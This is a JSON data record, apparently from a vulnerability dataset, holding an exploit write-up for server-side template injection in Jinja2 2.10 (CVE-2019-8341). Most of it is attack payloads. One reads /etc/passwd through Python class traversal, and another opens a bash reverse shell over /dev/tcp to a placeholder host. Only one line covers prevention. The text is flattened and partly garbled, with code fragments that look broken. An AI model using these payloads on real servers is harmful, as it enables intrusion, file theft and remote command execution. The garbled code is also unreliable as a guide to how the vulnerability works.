{
    "text": "vul_name : Jinja2 2.10 Command Injection ， vul_cve : CVE-2019-8341 ， vul_poc : ' ，  # Exploit Title : Jinja2 Command injection from_string function ，  # Date :  [ date ]  ，  # Exploit Author : JameelNabbo ，  # Website : Ordina.nl ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 2.10 ，  # Tested on : Kali Linux ，  # CVE-2019-8341 ， / from_string function is prone to SSTI where it takes the \"source\" parameter as a template object and render it and then return it. ， /here's an example about the vulnerable code that uses from_string function in order to handle a variable in GET called 'username' and returns Hello {username} :  ， ' ，  @ app.route ( \"/\" )  ， username = request.values.get ( 'username' )  ， app.run ( host='127.0.0.1' , port=4444 )  ， ' ， POC ， /Exploiting the username param ， OUTPUT : Hello 16 ， Reading the /etc/passwd ， '._class_._mro_ [ 2 ] ._subclasses_ (  )  [ 40 ]  ( '/etc/passwd' ) .read (  ) } ， Getting a reverse shell ， config [ 'RUNCMD' ]  ( 'bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1' , shell=True ) } ， How to prevent it :  ， Never let the user provide template content. ， '",
    "time": "2019.02.17"
}